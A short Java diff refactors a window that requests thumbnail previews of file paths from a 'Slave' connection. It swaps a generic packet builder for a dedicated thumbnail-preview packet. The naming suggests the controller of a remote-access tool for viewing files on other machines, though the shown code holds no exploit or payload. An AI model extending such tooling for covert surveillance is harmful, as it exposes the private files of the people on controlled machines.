@@ -33,8 +33,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet85ThumbnailPreview;
 import com.redpois0n.ui.renderers.ThumbsListRenderer;
 
 
@@ -199,7 +198,6 @@ public class FrameRemoteThumbView extends BaseFrame {
 	}
 	
 	public void addImage(String path, BufferedImage image) {
-		//path = new File(path).getName();
 		thumbs.put(path, new ImageIcon(image));
 		getModel().addElement(path);
 	}
@@ -207,8 +205,7 @@ public class FrameRemoteThumbView extends BaseFrame {
 	public void process() {
 		setProgress(0);
 		for (String str : paths) {
-			PacketBuilder packet = new PacketBuilder(OutgoingHeader.LIST_THUMBNAIL, str);
-			slave.addToSendQueue(packet);
+			slave.addToSendQueue(new Packet85ThumbnailPreview(str));
 		}		
 	}
 	
